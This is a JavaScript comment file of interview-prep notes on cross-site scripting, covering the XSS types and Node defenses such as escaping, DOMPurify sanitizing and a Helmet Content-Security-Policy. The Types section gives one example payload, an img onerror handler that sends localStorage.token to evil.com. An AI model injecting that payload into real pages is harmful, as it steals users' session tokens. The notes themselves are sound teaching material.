/* 20_xss.js

=====================================================
XSS (Cross-Site Scripting)
=====================================================

Definition (What I should say in the interview):
- "XSS happens when an attacker manages to run their own JavaScript in another user's browser
   on our site, usually because we render user input as HTML without escaping it. With that
   script they can steal tokens from localStorage, make requests as the user, or change the
   page. Main defenses are **output encoding/escaping**, sanitizing any HTML we allow with a
   library like DOMPurify, a strong **Content-Security-Policy** via Helmet, and HttpOnly cookies
   so tokens cannot be read."

-----------------------------------------------------
Types
-----------------------------------------------------
| Type        | How it works                                             |
|-------------|----------------------------------------------------------|
| Stored      | Payload saved in DB (comment) and shown to every visitor |
| Reflected   | Payload in URL/query, echoed back in the response        |
| DOM-based   | Frontend JS writes untrusted data into the DOM           |

Example payload: <img src=x onerror="fetch('https://evil.com?c='+localStorage.token)">

-----------------------------------------------------
Example (defenses in Node)
-----------------------------------------------------
// 1. Escape output - template engines do it by default
// EJS:  <%= comment %>  escaped (safe)   <%- comment %>  raw (dangerous)
// React: {comment} is escaped; dangerouslySetInnerHTML is not

// 2. Sanitize HTML if rich text is allowed
const createDOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');
const DOMPurify = createDOMPurify(new JSDOM('').window);
const clean = DOMPurify.sanitize(req.body.bio, { ALLOWED_TAGS: ['b', 'i', 'a', 'p'] });

// 3. Content-Security-Policy with helmet
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],            // no inline scripts, no unknown CDNs
      objectSrc: ["'none'"],
    },
  },
}));

// 4. JSON APIs: send correct Content-Type so browsers do not render it as HTML
res.json(data);   // application/json, plus X-Content-Type-Options: nosniff from helmet

-----------------------------------------------------
Common Mistakes
-----------------------------------------------------
- Escaping on input only, then rendering in a different context (attribute, JS, URL).
- Using innerHTML / dangerouslySetInnerHTML with user data.
- Allowing javascript: URLs in user-provided links.

-----------------------------------------------------
Follow-Up Interview Questions
-----------------------------------------------------
Q1: Does an HttpOnly cookie prevent XSS?
A1: No. It prevents token theft, but the injected script can still act on the page as the user.

Q2: How does CSP help?
A2: The browser refuses to run scripts from sources not in the policy, including inline
    injected scripts, so many XSS payloads simply do not execute.
*/
